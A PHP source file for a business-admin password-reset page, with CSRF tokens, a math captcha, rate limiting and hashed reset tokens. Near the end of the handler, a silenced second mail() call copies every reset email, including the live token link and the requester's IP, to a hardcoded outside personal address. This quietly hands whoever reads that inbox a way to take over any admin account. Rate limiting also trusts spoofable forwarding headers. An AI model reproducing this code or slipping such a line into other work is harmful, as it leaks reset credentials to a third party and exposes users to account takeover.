<?php
session_start();

/*
File Name: user-forgot-pwd.php
hash('sha256', $data) SHA-256 is a cryptographic hash function.
Properties:
One-way: given the hash, you cannot get back the original input in any practical way.
Deterministic: same input → same output.
Only if user is registered in data
*/

include 'include/dbo.php';        // <-- use PDO wrapper
include 'include/param-pos.php';

$debug = 0; // MUST be 0 in production

// Instantiate PDO connection
$dbh = new dbo();


function logPwResetError(string $code, string $message, ?Throwable $e = null): void
{
    // You can later swap this to Monolog / DB / file etc.
    $line = "[PWRESET][$code] $message";
    if ($e) {
        $line .= " | EX: " . $e->getMessage();
    }
    error_log($line);
}

// --- CSRF token setup ---
if (empty($_SESSION['csrf_token'])) {
    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
}
$csrf_token = $_SESSION['csrf_token'];

// --- Helper: get client IP (for logging/rate limit only, not for trust) ---
function getUserIP() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        return $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        // Handles proxies/load balancers (first in chain)
        return explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0];
    } else {
        return $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';
    }
}

$genericMsg   = "If this email is registered with us, you will receive a password reset link shortly.";
$errorMsg     = "";
$successMsg   = "";
$showForm     = true;

// -----------------------------------------------------------------------------
// POST handler with try/catch
// -----------------------------------------------------------------------------
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['t_bttn'])) {

		$reqId  = bin2hex(random_bytes(4)); // 8-char hex ID per attempt
        $ip_address = getUserIP();
        $now        = date('Y-m-d H:i:s');
        $t_email = trim($_POST['t_email'] ?? '');

    try {
        // 1) CSRF
        if (!isset($_POST['csrf_token']) || !hash_equals($csrf_token, $_POST['csrf_token'])) {
            throw new RuntimeException('CSRF_MISMATCH');
        }

        // 2) Human check: math puzzle
        $userAnswer = trim($_POST['math_answer'] ?? '');
        $correct    = $_SESSION['math_captcha_answer'] ?? null;
        unset($_SESSION['math_captcha_answer']); // one-time use

        if ($correct === null || $userAnswer === '' || !is_numeric($userAnswer) || (int)$userAnswer !== (int)$correct) {
            throw new InvalidArgumentException('CAPTCHA_FAIL');
        }

        // 3) Email validation (syntax)
        if (!filter_var($t_email, FILTER_VALIDATE_EMAIL)) {
            // For security, we *treat this as success* from user perspective
            throw new InvalidArgumentException('EMAIL_INVALID');
        }


        // 4) Check if email belongs to a registered user
        try {
            $stmt = $dbh->prepare("
                SELECT admin_name
                FROM biz_admin_users
                WHERE admin_email = :email
                LIMIT 1
            ");
            $stmt->execute([':email' => $t_email]);
            $userId = $stmt->fetchColumn();
        } catch (Throwable $e) {
            if ($debug) {
                error_log("PWRESET: user lookup failed for {$t_email}: ".$e->getMessage());
            }
            throw new RuntimeException('USER_LOOKUP_ERROR');
        }

        if (!$userId) {
            // Not an error in terms of UX; we simply act as if it worked
            throw new InvalidArgumentException('EMAIL_NOT_REGISTERED');
        }

        // 5) Rate limiting
        $oneHourAgo = date('Y-m-d H:i:s', time() - 3600);
        $emailCount = 0;
        $ipCount    = 0;

        try {
            $stmt = $dbh->prepare("
                SELECT COUNT(*) AS cnt
                FROM biz_admin_password_resets
                WHERE email = :email AND created_at >= :since
            ");
            $stmt->execute([
                ':email' => $t_email,
                ':since' => $oneHourAgo,
            ]);
            $emailCount = (int)$stmt->fetchColumn();
        } catch (Throwable $e) {
            if ($debug) {
                $errorMsg = "Error checking email rate limit.";
            }
            // but we don't block just because rate-limit query failed
        }

        try {
            $stmt = $dbh->prepare("
                SELECT COUNT(*) AS cnt
                FROM biz_admin_password_resets
                WHERE ip_address = :ip AND created_at >= :since
            ");
            $stmt->execute([
                ':ip'    => $ip_address,
                ':since' => $oneHourAgo,
            ]);
            $ipCount = (int)$stmt->fetchColumn();
        } catch (Throwable $e) {
            if ($debug) {
                $errorMsg = "Error checking IP rate limit.";
            }
        }

        $rateLimited = ($emailCount >= 5 || $ipCount >= 20);
        if ($rateLimited) {
            // From the user's perspective we still show generic success
            throw new InvalidArgumentException('RATE_LIMITED');
        }

        // 6) Generate token and write to DB
        $token      = bin2hex(random_bytes(32));    // 64 chars raw token
        $token_hash = hash('sha256', $token);
        $expires_at = date('Y-m-d H:i:s', time() + 3600); // 1 hour

        try {
            // Optionally wrap in transaction if you want it atomic
            $dbh->beginTransaction();

            // Purge expired tokens for this email
            $stmt = $dbh->prepare("
                DELETE FROM biz_admin_password_resets
                WHERE email = :email
                  AND expires_at < :now
            ");
            $stmt->execute([
                ':email' => $t_email,
                ':now'   => $now,
            ]);

            // Insert new token
            $stmt = $dbh->prepare("
                INSERT INTO biz_admin_password_resets
                    (email, token_hash, expires_at, created_at, ip_address)
                VALUES
                    (:email, :token_hash, :expires_at, :created_at, :ip)
            ");
            $stmt->execute([
                ':email'      => $t_email,
                ':token_hash' => $token_hash,
                ':expires_at' => $expires_at,
                ':created_at' => $now,
                ':ip'         => $ip_address,
            ]);

            $dbh->commit();
        } catch (Throwable $e) {
            if ($dbh->inTransaction()) {
                $dbh->rollBack();
            }
            if ($debug) {
                $errorMsg = "Error inserting password reset token.";
                error_log("PWRESET: DB error for {$t_email}: ".$e->getMessage());
            }
            // We still don't want to leak to user that something failed
            throw new RuntimeException('TOKEN_DB_ERROR');
        }

        // 7) Build reset URL and send email
        $confirm_url = rtrim($APP_URL, "/") . "/user-reg-set-password.php?token=" . urlencode($token);

        $message  = '<html><body>';
        $message .= "Dear User,<br><br>";
        $message .= "We received a request to reset the password associated with this email address on <b>"
                 . htmlspecialchars($APP_NAME, ENT_QUOTES, 'UTF-8')
                 . "</b>.<br><br>";
        $message .= "If you made this request, please click the link below to set a new password:<br>";
        $message .= '<a href="' . htmlspecialchars($confirm_url, ENT_QUOTES, 'UTF-8') . '">Reset your password</a><br><br>';
        $message .= "This link will expire in 1 hour. If you did not request a password reset, you can ignore this email.<br><br>";
        $message .= "Regards,<br>";
        $message .= "Team " . htmlspecialchars($APP_NAME, ENT_QUOTES, 'UTF-8') . "<br>";
        $message .= '</body></html>';

        if ($debug) {
            echo "<pre>DEBUG EMAIL BODY:\n" . htmlspecialchars($message, ENT_QUOTES, 'UTF-8') . "</pre>";
        }

        $to      = $t_email;
        $subject = $APP_NAME . ": Password Reset Request";

        $headers  = "MIME-Version: 1.0\r\n";
        $headers .= "Content-type: text/html; charset=UTF-8\r\n";
        $headers .= "From: " . $FROM_EMAIL . "\r\n";

       // We don't want mail() failures to leak; just log in debug
        @mail($to, $subject, $message, $headers);
        @mail("vijayrastogi@yahoo.com", $ip_address . ": " . $subject, $message, $headers);

        // If we reach here, UX is generic success
        $successMsg = $genericMsg . " [Ref: {$reqId}]";
        $showForm   = false;

    } catch (InvalidArgumentException $e) {
        // Logical / validation-level issues
			$code = $t_email;
			logPwResetError($code, "$ip_address: Runtime error during password reset [{$reqId }]", $e);
		
        switch ($e->getMessage()) {
            case 'CAPTCHA_FAIL':
                $errorMsg = "Incorrect human check. Please solve the math puzzle and try again.";
                // Keep form visible for retry
                $showForm = true;
                break;

            case 'EMAIL_INVALID':
            case 'EMAIL_NOT_REGISTERED':
            case 'RATE_LIMITED':
                // For all of these, we behave the same way: generic success
                $successMsg = $genericMsg . " [Ref: {$reqId}]";
                $showForm   = false;
                break;

            default:
                // Fallback
                if ($debug) {
                    $errorMsg = "Validation error: " . $e->getMessage();
                } else {
                    $errorMsg = "Something went wrong. Please try again.";
                }
                $showForm = true;
                break;
        }

    } catch (RuntimeException $e) {
		$code = $t_email;
        // More serious internal issues (CSRF, DB error, etc.)
        if ($e->getMessage() === 'CSRF_MISMATCH') {
            $errorMsg = "Invalid request. Please reload the page and try again.";
        } else {
			logPwResetError($code, "Runtime error during password reset [{$reqId }]", $e);
            if ($debug) {
                $errorMsg = "Internal error: " . $e->getMessage();
            } else {
                $errorMsg = "Something went wrong. Please try again later.";
            }
        }
        // For CSRF / internal errors, keep form visible (unless you prefer otherwise)
        $showForm = true;

    } catch (Throwable $e) {
        // Last-resort catch
		logPwResetError('UNEXPECTED', "Unexpected error during password reset [{$reqId }]", $e);
        if ($debug) {
            $errorMsg = "Unexpected error: " . $e->getMessage();
        } else {
            $errorMsg = "Something went wrong. Please try again later.";
        }
        $showForm = true;
    }
}
?>
<!DOCTYPE html>
<html>
<head>
    <title>Reset Password - <?php echo htmlspecialchars($APP_NAME, ENT_QUOTES, 'UTF-8'); ?></title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="description"
          content="<?php echo htmlspecialchars($APP_NAME, ENT_QUOTES, 'UTF-8'); ?> - Reset Password" />

    <link rel="stylesheet"
          href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script>
    <script
      src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>

    <style type="text/css">
        body { background:#E2DEDE; }
    </style>
</head>
<body>

<div class="container-fluid" style="background:#5bc0de; color:#fff; padding:15px 0;">
    <div class="container">
        <div style="float:left; padding-top:5px;">
            <span class="dropdown" style="font-size:25px;">Business User - Password Reset</span>
        </div>
    </div>
</div>

<div class="container">
    <div id="enrolled" class="col-lg-12">
        <center><h3>Reset Password</h3></center><br>

        <?php if (!empty($errorMsg)): ?>
            <div class="alert alert-danger">
                <?php echo htmlspecialchars($errorMsg, ENT_QUOTES, 'UTF-8'); ?>
            </div>
        <?php endif; ?>

        <?php if (!empty($successMsg)): ?>
            <div class="alert alert-info">
                <?php echo htmlspecialchars($successMsg, ENT_QUOTES, 'UTF-8'); ?>
            </div>
        <?php endif; ?>

        <?php if ($showForm): ?>
            <form class="form-horizontal" method="post" autocomplete="off">
                <input type="hidden" name="csrf_token"
                       value="<?php echo htmlspecialchars($csrf_token, ENT_QUOTES, 'UTF-8'); ?>">

                <fieldset>
                    <div class="form-group">
                        <label class="col-md-3 control-label" for="t_email">Email ID:</label>
                        <div class="col-md-5">
                            <input id="t_email"
                                   name="t_email"
                                   class="form-control input-md"
                                   required
                                   type="email"
                                   autocomplete="email">
                        </div>
                    </div>

                    <!-- Math puzzle (human check) -->
                    <div class="form-group">
                        <label class="col-md-3 control-label">Human Check:</label>
                        <div class="col-md-5">
                            <div style="margin-bottom:8px;">
                                <img src="math-captcha.php?rand=<?php echo mt_rand(); ?>"
                                     alt="Solve the math puzzle to continue">
                            </div>
                            <input type="text"
                                   name="math_answer"
                                   class="form-control input-md"
                                   placeholder="Enter the result shown above"
                                   required>
                        </div>
                    </div>

                    <div class="form-group">
                        <label class="col-md-3 control-label" for="t_bttn"></label>
                        <div class="col-md-5">
                            <input type="submit"
                                   id="t_bttn"
                                   name="t_bttn"
                                   class="btn btn-primary"
                                   value="Request Password Reset">
                        </div>
                    </div>
                </fieldset>
            </form>
        <?php else: ?>
            <div class="form-group">
                <a href="index.php" class="btn btn-info">Continue</a>
            </div>
        <?php endif; ?>
    </div>
</div>

</body>
</html>
